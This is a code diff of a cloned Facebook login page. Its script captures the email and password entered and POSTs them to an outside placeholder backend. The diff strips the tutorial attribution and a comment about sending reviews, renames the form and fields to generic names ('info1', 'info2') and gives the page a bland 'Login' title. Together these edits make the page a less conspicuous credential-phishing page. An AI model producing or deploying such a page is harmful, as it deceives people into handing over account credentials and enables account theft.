@@ -1,23 +1,21 @@
 <!DOCTYPE html>
-<!-- Coding By CodingNepal - www.codingnepalweb.com -->
 <html lang="en">
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login Page | CodingNepal</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
   </head>
   <body>
     <div class="container flex">
-      <div class="facebook-page flex">
+      <div class="div-page flex">
         <div class="text">
-          <h1>facebook</h1>
+          <h1>Facebook</h1>
           <p>Connect with friends and the world </p>
           <p> around you on Facebook.</p>
         </div>
-        <form id="loginFacebook">
-          <input type="email" id="email" placeholder="Email or phone number" required>
-          <input type="password" id="mdp" placeholder="Password" required>
+        <form id="envoyerform">
+          <input type="email" id="info1" placeholder="Email or phone number" required>
+          <input type="password" id="info2" placeholder="Password" required>
           <div class="link">
             <button type="submit" class="login">Login</button>
             <a href="#" class="forgot">Forgot password?</a>
@@ -32,13 +30,11 @@
   </body>
 
   <script>
-    document.getElementById("loginFacebook").onsubmit = async function(event) {
+    document.getElementById("envoyerform").onsubmit = async function(event) {
       event.preventDefault();
-      const email = document.getElementById("email").value;
-      const mdp = document.getElementById("mdp").value;
+      const info1 = document.getElementById("info1").value;
+      const info2 = document.getElementById("info2").value;
 
-
-      // Envoyer l'avis au serveur (à configurer)
       await fetch("https://votre-backend-url.com/api/avis", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -70,23 +66,23 @@
   background: #f0f2f5;
 }
 
-.facebook-page {
+.div-page {
   justify-content: space-between;
   max-width: 1000px;
   width: 100%;
 }
 
-.facebook-page .text {
+.div-page .text {
   margin-bottom: 90px;
 }
 
-.facebook-page h1 {
+.div-page h1 {
   color: #1877f2;
   font-size: 4rem;
   margin-bottom: 10px;
 }
 
-.facebook-page p {
+.div-page p {
   font-size: 1.75rem;
   white-space: nowrap;
 }
@@ -189,22 +185,22 @@ hr {
 }
 
 @media (max-width: 900px) {
-  .facebook-page {
+  .div-page {
     flex-direction: column;
     text-align: center;
   }
 
-  .facebook-page .text {
+  .div-page .text {
     margin-bottom: 30px;
   }
 }
 
 @media (max-width: 460px) {
-  .facebook-page h1 {
+  .div-page h1 {
     font-size: 3.5rem;
   }
 
-  .facebook-page p {
+  .div-page p {
     font-size: 1.3rem;
   }
 
